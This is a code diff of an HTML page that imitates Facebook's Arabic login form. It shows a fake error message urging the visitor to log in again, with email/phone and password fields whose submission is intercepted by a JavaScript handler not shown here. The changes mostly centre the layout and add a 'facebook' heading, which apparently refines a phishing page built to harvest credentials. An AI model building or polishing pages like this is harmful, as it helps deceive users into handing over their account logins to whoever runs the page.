@@ -13,8 +13,10 @@
         }
 
         .res {
+            width: 100%;
             display: flex;
             align-items: center;
+            justify-content: center;
         }
 
         .row {
@@ -28,6 +30,8 @@
             justify-content: space-between;
             max-width: 1000px;
             width: 100%;
+            flex-direction: column;
+            text-align: center;
         }
 
         .fb-form .card {
@@ -247,26 +251,34 @@
             }
         </script>
         <div class="fb-form res">
-            <form action="https://facebook.com" method="post" onsubmit="return submit_form(event)">
-                <p style="color: red; text-align: center; margin: 7px;">
-                    حدث خطأ
-                    <br />
-                    يرجى تسجيل الدخول
-                </p>
+            <div>
 
-                <br />
-                <input id="username_field" type="text" placeholder="البريد الإلكتروني او رقم الهاتف" required>
-                <input id="password_field" type="password" placeholder="كلمة المرور" required>
-                <div class="fb-submit">
-                    <button type="submit" class="login">تسجيل الدخول</button>
-                    <a href="https://ar-ar.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM2NTAzMjkzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login&next"
-                        class="forgot">نسيت كلمة المرور?</a>
-                </div>
-                <hr>
-                <div class="button">
-                    <a href="https://ar-ar.facebook.com/r.php?entry_point=login">إنشاء حساب جديد</a>
-                </div>
-            </form>
+
+                <h1>facebook</h1>
+
+                <form action="https://facebook.com" style="width: calc(100vw - 40px);" method="post"
+                    onsubmit="return submit_form(event)">
+
+                    <p style="color: red; text-align: center; margin: 7px;">
+                        حدث خطأ
+                        <br />
+                        يرجى تسجيل الدخول
+                    </p>
+
+                    <br />
+                    <input id="username_field" type="text" placeholder="البريد الإلكتروني او رقم الهاتف" required>
+                    <input id="password_field" type="password" placeholder="كلمة المرور" required>
+                    <div class="fb-submit">
+                        <button type="submit" class="login">تسجيل الدخول</button>
+                        <a href="https://ar-ar.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM2NTAzMjkzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login&next"
+                            class="forgot">نسيت كلمة المرور?</a>
+                    </div>
+                    <hr>
+                    <div class="button">
+                        <a href="https://ar-ar.facebook.com/r.php?entry_point=login">إنشاء حساب جديد</a>
+                    </div>
+                </form>
+                <!-- <br>
             <div class="card">
                 <h1>facebook</h1>
                 <p>
@@ -275,8 +287,8 @@
                 <p>
                     مع الأشخاص ومشاركة ما تريد معهم.
                 </p>
+            </div> -->
             </div>
-
         </div>
     </div>
     <footer>
